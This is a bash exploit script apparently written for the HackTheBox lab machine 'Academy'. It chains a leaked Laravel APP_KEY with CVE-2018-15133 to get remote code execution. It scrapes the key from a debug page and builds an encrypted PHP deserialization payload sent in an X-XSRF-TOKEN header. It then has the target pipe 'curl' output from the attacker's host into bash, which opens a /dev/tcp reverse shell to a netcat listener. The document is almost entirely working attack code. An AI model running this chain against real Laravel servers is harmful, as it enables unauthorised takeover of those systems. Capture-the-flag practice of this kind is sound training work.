#!/bin/bash

set -eux

RHOST=10.10.10.215
LHOST=$(ip address show dev tun0 | grep -oP 'inet (\d+\.\d+\d+\.\d+\.\d+)' | awk '{print $2}')
LPORT=8080



check_appkey(){
	curl -s dev-staging-01.academy.htb \
	  | grep '<td>APP_KEY</td>' -A 1 \
	  | grep -m 1 -oP 'base64:([0-9a-zA-Z/+=]+)' \
	  | awk -F':' '{print $2}'
}

generate_payload(){
  local cmd=$1 key_b64=$2
  payload_decoded=$"O:40:\"Illuminate\\Broadcasting\\PendingBroadcast\":2:{s:9:\"\x00*\x00events\";O:15:\"Faker\\Generator\":1:{s:13:\"\x00*\x00formatters\";a:1:{s:8:\"dispatch\";s:6:\"system\";}}s:8:\"\x00*\x00event\";"$"s:${#cmd}:\"${cmd}\";}"
  iv_hex=$(xxd -c 16 -p -l 16 /dev/random)
  key=$(echo -n $key_b64 | base64 -d -w0)
  key_hex=$(echo -n $key | xxd -p -c 9999)
  # encrypt decoded payload with AES-256-CBC and APPKey
  pload=$(echo -en $payload_decoded | openssl enc -e -aes-256-cbc -K $key_hex -iv $iv_hex | base64 -w0)
  iv_b64=$(echo -n $iv_hex | xxd -c 16 -r -p | base64 -w0)
  # create HMAC of IV and encrypted payload using the APPKey
  mac=$(echo -n "${iv_b64}${pload}" | openssl dgst -sha256 -mac HMAC -macopt hexkey:$key_hex | cut -d ' ' -f 2)
  json_value="{\"iv\":\"${iv_b64/\//\\\/}\",\"value\":\"${pload/\//\\\/}\",\"mac\":\"${mac}\"}"
  echo -n $json_value | base64 -w0
}


foothold(){
  ## CVE-2018-15133, CVE-2017-16894
  local auth_token=$(check_appkey)
  local url="dev-staging-01.academy.htb"
  local callback=$(echo -e "\#\!bin/bash\n\nbash -i >& /dev/tcp/$LHOST/$LPORT 0>&1")
  local cmd="sleep 1;curl http://$LHOST:8000 | /bin/bash"
  local payload=$(generate_payload "${cmd}" $auth_token)
  ( cat << EOF 
HTTP/1.0 200 OK
Date: $(date)
Content-type: text/plain
Content-Length: ${#callback}
$callback
EOF
) | netcat -lnvp 8000 &
  curl -s -q http://$url/index.php -H "X-XSRF-TOKEN: ${payload}" -X POST -d "" > /dev/null &
  netcat -lvnp $LPORT
}


while getopts “fu::” opt; do
  case $opt in
    f) foothold ;;
    u) user ;;
    *) echo "Error"
  esac
done
